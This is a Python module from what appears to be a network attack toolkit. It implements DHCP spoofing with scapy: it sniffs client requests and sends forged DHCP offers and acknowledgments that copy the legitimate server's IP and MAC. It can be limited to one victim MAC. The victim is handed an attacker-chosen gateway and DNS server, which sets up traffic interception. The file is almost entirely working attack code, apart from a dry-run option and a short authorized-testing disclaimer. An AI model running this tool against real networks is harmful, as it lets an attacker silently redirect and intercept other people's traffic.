"""DHCP spoofing: answer clients in the name of the legitimate DHCP server.

The rogue DHCP server answers with its own identity. A spoofer answers with the
legitimate server's address and MAC, so the client sees the server it expects. The
spoofer can also limit its answers to one target client, which keeps the rest of the
network on the real server.

The offer and acknowledgment are built by the rogue responder, with the source MAC
and the server identifier taken from the legitimate server. Clients receive a lease
whose gateway and DNS the spoofer chose.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import BOOTP, AsyncSniffer, sendp
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac
from macabre.attacks.rogue_dhcp_server import RogueDhcpConfig, respond


@dataclass(frozen=True)
class DhcpSpoofingConfig:
    iface: str                       # attacker interface, on the segment with the clients
    server_ip: str                   # the legitimate server's address (copied)
    server_mac: str                  # the legitimate server's MAC (copied; required)
    offer_ip: str                    # address offered to the client
    subnet_mask: str = "255.255.255.0"
    router: str = ""                 # gateway the spoofer offers; empty = server_ip
    dns: str = ""                    # DNS the spoofer offers; empty = server_ip
    target_mac: str = ""             # only answer this client; empty = answer every client
    dry_run: bool = False
    extra_options: tuple = ()       # (code, value) options added to every reply

    def __post_init__(self) -> None:
        if not self.server_mac:
            raise ValueError("The legitimate server's MAC is required: copy it from its traffic.")
        normalize_unicast_mac(self.server_mac)
        if self.target_mac:
            normalize_unicast_mac(self.target_mac)
        self.to_rogue_config()          # checks the addresses with the same rules as the rogue server

    def to_rogue_config(self) -> RogueDhcpConfig:
        return RogueDhcpConfig(
            iface=self.iface,
            server_ip=self.server_ip,
            offer_ip=self.offer_ip,
            subnet_mask=self.subnet_mask,
            router=self.router,
            dns=self.dns,
            extra_options=self.extra_options,
        )


@dataclass
class DhcpSpoofingStats:
    offers: int = 0
    acks: int = 0
    status: str = ""


def _targeted(packet: Packet, target_mac: str) -> bool:
    if not target_mac:
        return True
    return packet[BOOTP].chaddr[:6].hex(":") == normalize_unicast_mac(target_mac)


def run_dhcp_spoofing(
    config: DhcpSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[DhcpSpoofingStats], None],
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> DhcpSpoofingStats:
    """Answer the target client (or every client) in the legitimate server's name until stopped."""
    send = send or sendp

    if config.dry_run:
        target = config.target_mac or "every client"
        stats = DhcpSpoofingStats(
            status=(
                f"Dry run: would answer {target} as {config.server_ip} ({config.server_mac}) "
                f"with offers for {config.offer_ip}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    rogue = config.to_rogue_config()
    server_mac = normalize_unicast_mac(config.server_mac)
    stats = DhcpSpoofingStats()
    lock = threading.Lock()

    def on_packet(packet: Packet) -> None:
        if not _targeted(packet, config.target_mac):
            return
        reply = respond(rogue, server_mac, packet)
        if reply is None:
            return
        kind, frame = reply
        with lock:
            if kind == "offer":
                stats.offers += 1
            else:
                stats.acks += 1
            snapshot = replace(stats)
        send(frame, iface=config.iface, verbose=False)
        on_progress(snapshot)

    sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
    sniffer.start()
    try:
        stop_event.wait()
    finally:
        sniffer.stop()
    return stats
